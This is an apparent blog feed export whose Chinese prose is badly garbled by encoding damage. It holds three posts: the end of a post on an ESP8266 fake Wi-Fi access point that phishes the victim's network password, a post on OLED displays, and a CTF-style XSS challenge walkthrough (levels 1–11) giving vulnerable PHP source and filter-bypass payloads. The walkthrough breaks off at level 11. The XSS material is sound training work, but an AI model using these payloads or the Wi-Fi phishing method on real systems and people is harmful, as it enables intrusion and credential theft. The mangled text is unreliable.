<h5 id="è·å–å¯†ç "><a href="#è·å–å¯†ç " class="headerlink" title="è·å–å¯†ç "></a><strong>è·å–å¯†ç </strong></h5><p>è¿™æ—¶å€™è¢«é’“é±¼çš„wifiä¼šè¿æ¥ä¸ä¸Šï¼Œå¹¶ä¸”è¿™æ—¶å€™æˆ‘ä»¬æ¿å­çš„wifi(FishAP)çš„åå­—ä¼šä¼ªè£…æˆè¢«é’“é±¼wifiçš„åå­—ã€‚æ¿å­çš„è“ç¯ä¼šå¼€å§‹å¸¸äº®ã€‚</p>
<p>ç„¶åè¢«é’“é±¼çš„æ‰‹æœºä¼šè¿ä¸Šæˆ‘ä»¬ä¼ªé€ çš„wifi,ç„¶åç»§ç»­ä¼šå¼¹å‡ºæˆ‘ä»¬é’“é±¼åå°(192.168.0.1)ï¼Œå¦‚å›¾</p>
<img src="http://img.kawhi.xyz/wifi123.png" alt="image-wifi123" style="high:50%;width:50%;" />

<p>å½“ç„¶ï¼Œè¿™æ—¶å€™ä»–æ˜¯ä¸Šä¸äº†ç½‘çš„ï¼Œå¦‚æœä»–è¾“å…¥äº†wifiå¯†ç çš„è¯ï¼Œé’“é±¼å°±æˆåŠŸäº†ã€‚åœ¨æŒ‰å‡çº§å®Œæ¯•ä¹‹åï¼Œæˆ‘ä»¬çš„æ¿å­çš„ç¯ä¼šç­ï¼Œè¯´æ˜å·²ç»æˆåŠŸçš„è·å–å¯†ç äº†ã€‚</p>
<p>è¿™æ—¶å€™å†é‡æ–°è¿æ¥æˆ‘ä»¬æ¿å­çš„wifi(FishAP)ã€‚å³å¯çœ‹åˆ°é’“é±¼çš„å¯†ç ã€‚</p>
<img src="http://img.kawhi.xyz/QQ%E6%88%AA%E5%9B%BE20200405211928.jpg" style="high:60%;width:60%;" />]]></content>
      <categories>
        <category>ç¡¬ä»¶</category>
      </categories>
  </entry>
  <entry>
    <title>esp8266è¿æ¥æ˜¾ç¤ºå™¨</title>
    <url>/2020/03/21/esp8266%E8%BF%9E%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/</url>
    <content><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h5><p>**ç®€ä»‹:**æœ¬ç¯‡æ–‡ç« å±•ç¤ºç”¨OLEDæ˜¾ç¤ºå±ä¸ESP8266è¿æ¥ã€‚OLEDæ·˜å®ä¸Šä¸€èˆ¬æœ‰ä¸¤ç§ï¼Œ4å¼•è„š(IIC)å’Œ7å¼•è„š(SPI)ï¼Œ7å¼•è„šçš„å±å¹•å°±ç¨å¾®å¤§ç‚¹ã€‚è¿™é‡Œæˆ‘ç”¨çš„æ˜¯4å¼•è„šã€‚æ¥çº¿å¦‚ä¸‹æ‰€ç¤ºã€‚åŸºæœ¬å°±3.3æ¥vccï¼Œgndåœ°çº¿æ¥åœ°çº¿æ²¡æœ‰é—®é¢˜ï¼Œå¼•ç”¨è§’D1(GPIO5)ï¼ŒD2(GPIO4)æ¥SLCå’ŒSDAã€‚</p>
<p><strong>ä»·æ ¼ï¼š</strong>ä¸€ä¸ªesp8266å’Œoledæ˜¾ç¤ºå™¨åŠ èµ·æ¥ä¹Ÿå°±20å—å·¦å³ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200321115923891.png" alt="image-20200321115923891" style="high:40%;width:40%;" />

<h5 id="åŸºæœ¬æ˜¾ç¤º"><a href="#åŸºæœ¬æ˜¾ç¤º" class="headerlink" title="åŸºæœ¬æ˜¾ç¤º"></a><strong>åŸºæœ¬æ˜¾ç¤º</strong></h5><p><strong>è¾“å‡ºhello worldï¼</strong></p>
<p>é¦–å…ˆè¦è£…ä¸€ä¸ªU8g2çš„åº“ï¼Œç„¶ååªéœ€è¦çŸ­çŸ­10å¤šè¡Œä»£ç å³å¯æ˜¾ç¤ºã€‚</p>
<img src="http://img.kawhi.xyz/image-20200321104619926.png" alt="image-20200321104619926" style="high:80%;width:80%;" />

<p><strong>è¾“å‡ºåŠ¨ç”»</strong></p>
<p>é¡¹ç›®ä»£ç ï¼š<a style="text-decoration:none;" class="foo" href="https://github.com/icomgx/esp8266_codePlayer" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™ä¸ªé¡¹ç›®æ˜¯ç”¨pythonç‰¹æ®Šå¤„ç†äº†ä½ çš„è§†é¢‘ï¼ŒåŸç†å¤§æ¦‚æ˜¯æŠŠè§†é¢‘åˆ‡æˆå¾ˆå¤šå¸§å›¾ç‰‡ï¼Œç„¶åå› ä¸ºoledæ— æ³•æ˜¾ç¤ºå½©è‰²è§†é¢‘ï¼Œæ‰€ä»¥éœ€è¦æŠŠå›¾ç‰‡ç°åº¦åŒ–ï¼Œç„¶åå†è¿›è¡Œè½¬ç ï¼Œè¿™æ ·è§†é¢‘å°±å¯ä»¥åœ¨æ˜¾ç¤ºå™¨ä¸Šé€å¸§æ’­æ”¾ä½ çš„è§†é¢‘äº†ã€‚</p>
<video width="320" height="200" controls="controls">
  <source src="http://img.kawhi.xyz/QQ%E8%A7%86%E9%A2%9120200321123849.mp4" type="video/mp4" />
</video>


<h5 id="æ˜¾ç¤ºç”µè„‘æƒ…å†µ"><a href="#æ˜¾ç¤ºç”µè„‘æƒ…å†µ" class="headerlink" title="æ˜¾ç¤ºç”µè„‘æƒ…å†µ"></a><strong>æ˜¾ç¤ºç”µè„‘æƒ…å†µ</strong></h5><img src="http://img.kawhi.xyz/image-20200320212053043.png" alt="image-20200320212053043" style="high:80%;width:80%;" />

<p>é¡¹ç›®ä»£ç ï¼š<a style="text-decoration:none;" class="foo" href="https://github.com/flyAkari/AIDA64Reader" target="_blank">ä¼ é€é—¨</a></p>
<p>æ‰€éœ€å·¥å…·ï¼šAIDA64ï¼ŒArduinoçš„u8g2åº“ã€‚</p>
<p>åœ¨AIDA64æŠŠä¸‹å›¾éƒ½å‹¾é€‰ä¸Šï¼Œå†æŠŠä»£ç ä¸Šä¼ åˆ°esp8266æ¿å­ä¸Šå³å¯ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200320212408242.png" alt="image-20200320212408242" style="high:80%;width:80%;" />


<h5 id="æ˜¾ç¤ºåŒ—äº¬æ—¶é—´"><a href="#æ˜¾ç¤ºåŒ—äº¬æ—¶é—´" class="headerlink" title="æ˜¾ç¤ºåŒ—äº¬æ—¶é—´"></a><strong>æ˜¾ç¤ºåŒ—äº¬æ—¶é—´</strong></h5><img src="http://img.kawhi.xyz/image-20200321102945702.png" alt="image-20200321102945702" style="high:80%;width:80%;" />

<p>é¡¹ç›®ä»£ç ï¼š<a style="text-decoration:none;" class="foo" href="https://github.com/flyAkari/ESP8266_Network_Clock" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™ä¸ªé¡¹ç›®æ˜¯ä½¿ç”¨çš„çƒ§å½•å·¥å…·ç›´æ¥ä¸Šä¼ çš„ï¼Œå…å»äº†æ­å»ºç¯å¢ƒçš„éº»çƒ¦ã€‚</p>
<h5 id="æ˜¾ç¤ºå®æ—¶è‚ºç‚ç–«æƒ…"><a href="#æ˜¾ç¤ºå®æ—¶è‚ºç‚ç–«æƒ…" class="headerlink" title="æ˜¾ç¤ºå®æ—¶è‚ºç‚ç–«æƒ…"></a><strong>æ˜¾ç¤ºå®æ—¶è‚ºç‚ç–«æƒ…</strong></h5><img src="http://img.kawhi.xyz/image-20200321113448668.png" alt="image-20200321113448668" style="high:80%;width:80%;" />

<p>é¡¹ç›®ä»£ç ï¼š<a style="text-decoration:none;" class="foo" href="https://gitee.com/ikcty/pneumonia" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™é‡Œéœ€è¦è£…ä¸€ä¸ªArduinojsonåº“ï¼ŒåŒæ—¶éœ€è¦è¿è¡Œä»£ç é‡Œé¢çš„pythonæœåŠ¡ç«¯ã€‚ä»£ç é‡Œé¢å…·ä½“æ€ä¹ˆå®ç°æˆ‘å°±æ²¡æœ‰å»ç ”ç©¶äº†ã€‚</p>
<p>å¯ä»¥æ˜¾ç¤ºç´¯è®¡æ²»æ„ˆæ•°ï¼Œç°æœ‰ç¡®è¯Šï¼Œç°æœ‰ç–‘ä¼¼ï¼Œç´¯è®¡æ­»äº¡æ•°ã€‚æ¯ä¸€åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡æ•°æ®ã€‚æ¯ä¸ªæ•°æ®æ˜¾ç¤º15ç§’ã€‚</p>
]]></content>
      <categories>
        <category>ç¡¬ä»¶</category>
      </categories>
  </entry>
  <entry>
    <title>XSSé—¯å…³å°æ¸¸æˆ</title>
    <url>/2020/04/29/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h5><p>ç»ƒä¹ ä¸€ä¸‹xssã€‚å¹³å°åœ°å€ä¸ºï¼š<a style="text-decoration:none;" class="foo" href="http://test.ctf8.com/" target="_blank">ä¼ é€é—¨</a></p>
<h5 id="level1"><a href="#level1" class="headerlink" title="level1"></a><strong>level1</strong></h5><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥ç»™nameä¼ å€¼ï¼Œ<strong>payloadï¼š</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200429170941592.png" alt="image-20200429170941592" style="high:80%;width:80%;" />

<p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;</span>.$str.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="level2"><a href="#level2" class="headerlink" title="level2"></a><strong>level2</strong></h5><p>æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>h2æ ‡ç­¾è¢«<code>htmlspecialchars</code>å‡½æ•°è½¬ä¹‰äº†ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œxssã€‚</p>
<p>ä½†æ˜¯å‘ç°æœ‰inputæ¡†ï¼Œè¿™é‡Œä½¿ç”¨é—­åˆåŒå¼•å·å°±å¯ä»¥æ­£å¸¸å¼¹çª—ã€‚</p>
<p><strong>payload:</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span> onclick=<span class="string">&quot;alert(/xss/)</span></span><br><span class="line"><span class="string">&quot;</span> onclick=alert(/xss/)&gt;</span><br><span class="line"><span class="string">&quot; onmouseover=alert(/xss/)&gt;</span></span><br><span class="line">&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;go&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h5 id="level3"><a href="#level3" class="headerlink" title="level3"></a><strong>level3</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.htmlspecialchars($str).<span class="string">&quot;&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸¤ä¸ªåœ°æ–¹éƒ½è½¬ä¹‰äº†ï¼Œ&lt;&gt;ä¼šè¢«è½¬ä¹‰ã€‚é—­åˆå•å¼•å·ï¼Œä½¿ç”¨äº‹ä»¶å¼¹çª—ã€‚</p>
<p><strong>payload:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=alert(/xss/)//</span></span><br><span class="line"><span class="string">&#x27;</span> onclick=<span class="string">&#x27;alert(/xss/)</span></span><br></pre></td></tr></table></figure>

<h5 id="level4"><a href="#level4" class="headerlink" title="level4"></a><strong>level4</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str2);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str3.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å°–æ‹¬å·è¢«æ›¿æ¢ä¸ºç©ºäº†ã€‚</p>
<p><code>onfocus</code>äº‹ä»¶ï¼šå®šä¹‰çš„äº‹ä»¶å°†åœ¨å¯¹è±¡è·å¾—ç„¦ç‚¹æ—¶è§¦å‘ï¼Œautoè‡ªåŠ¨è·å¾—ç„¦ç‚¹ã€‚</p>
<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br><span class="line"><span class="string">&quot; onfocus=alert(/xss/) autofocus=&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="level5"><a href="#level5" class="headerlink" title="level5"></a><strong>level5</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str3.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>on</code>ï¼Œ<code>&lt;script</code>ä¸­é—´æ’å…¥äº†_ã€‚è€Œä¸”ä½¿ç”¨äº†<code>strtolower</code>è¿™ä¸ªå‡½æ•°å¯¼è‡´å¤§å°å†™ç»•è¿‡è¡Œä¸é€šã€‚ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤&lt;&gt;ã€‚</p>
<p><strong>payload:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;go&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="level6"><a href="#level6" class="headerlink" title="level6"></a><strong>level6</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str6.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>script</code>ï¼Œ<code>on</code>ï¼Œ<code>src</code>ï¼Œ<code>data</code>ï¼Œ<code>href</code>ä¸­é—´æ’å…¥äº†_ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¿‡æ»¤å¤§å°å†™ã€‚</p>
<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;Script&gt;alert(/xss/)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">Src</span>=<span class="string">x</span> <span class="attr">OnError</span>=<span class="string">alert(/xss/)</span>&gt;</span></span></span><br><span class="line"><span class="xml">&quot; Onclick=&quot;alert(/xss/)</span></span><br></pre></td></tr></table></figure>

<h5 id="level7"><a href="#level7" class="headerlink" title="level7"></a><strong>level7</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str =strtolower( $_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,$str5);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str6.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†<code>script</code>ï¼Œ<code>on</code>ï¼Œ<code>src</code>ï¼Œ<code>data</code>ï¼Œ<code>href</code>æ›¿æ¢ä¸ºç©ºï¼Œå¹¶ä¸”è¿‡æ»¤äº†å¤§å°å†™ï¼Œå°è¯•åŒå†™ç»•è¿‡ã€‚</p>
<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;sscriptcript&gt;alert(/xss/)&lt;/sscriptcript&gt;</span></span><br><span class="line"><span class="string">&quot;</span> oonnmouseover=<span class="string">&quot;alert(/xss/)</span></span><br></pre></td></tr></table></figure>

<h5 id="level8"><a href="#level8" class="headerlink" title="level8"></a><strong>level8</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,$str6);</span><br><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;</span>&gt;</span><br><span class="line"> echo <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.$str7.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>script</code>ï¼Œ<code>on</code>ï¼Œ<code>src</code>ï¼Œ<code>data</code>ï¼Œ<code>href</code>ä¸­é—´æ’å…¥äº†_ï¼Œå¹¶ä¸”è¿‡æ»¤äº†å¤§å°å†™ã€‚åœ¨hrefä¸­<code>&quot;</code>è¢«è½¬æ¢ä¸ºhtmlå®ä½“ï¼Œå¯ä»¥ä½¿ç”¨ç¼–ç ä»£æ›¿ç»•è¿‡ã€‚</p>
<p><strong>payload:</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Javascrip&amp;#x74;:alert(/xss/)</span><br><span class="line">Javasc&amp;#114;ipt:alert(/xss/)</span><br><span class="line">Javasc&amp;#x0072;ipt:alert(/xss/)</span><br></pre></td></tr></table></figure>

<h5 id="level9"><a href="#level9" class="headerlink" title="level9"></a><strong>level9</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,$str6);</span><br><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(false===strpos($str7,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.$str7.<span class="string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤çš„ä¸œè¥¿éƒ½å’Œç¬¬å…«å…³ä¸€æ ·ï¼Œå¤šäº†ä¸€ä¸ªæ£€æµ‹http://è€Œå·²</p>
<p><strong>payload:</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Javascrip&amp;#x74;:alert(/xss/) //http://</span><br><span class="line">Javascrip&amp;#x74;:%0ahttp://%0aalert(/xss/)</span><br><span class="line">Javascrip&amp;#x74;:%0dhttp://%0dalert(/xss/)</span><br></pre></td></tr></table></figure>

<h5 id="level10"><a href="#level10" class="headerlink" title="level10"></a><strong>level10</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åªæœ‰t_sortè¢«èµ‹å€¼äº†ã€‚</p>
<p><strong>payload:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?t_sort=<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h5 id="level11"><a href="#level11" class="headerlink" title="level11"></a><strong>level11</strong></h5><p>æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.htmlspecialchars($str).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°<code>keyword</code>å’Œ<code>t_sort</code>è¿™ä¸¤ä¸ªå‚æ•°éƒ½è¢«<code>htmlspecialchars</code>ã€‚</p>
<p>è€Œ<code>t_ref</code>æ˜¯referå¤´ï¼Œè¿‡æ»¤äº†å°–æ‹¬å·ã€‚æˆªåŒ…æ”¹referå¤´å³å¯ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200429203051769.png" alt="image-20200429203051769" style="high:80%;width:80%;" />

<p><strong>payload:</strong></p>
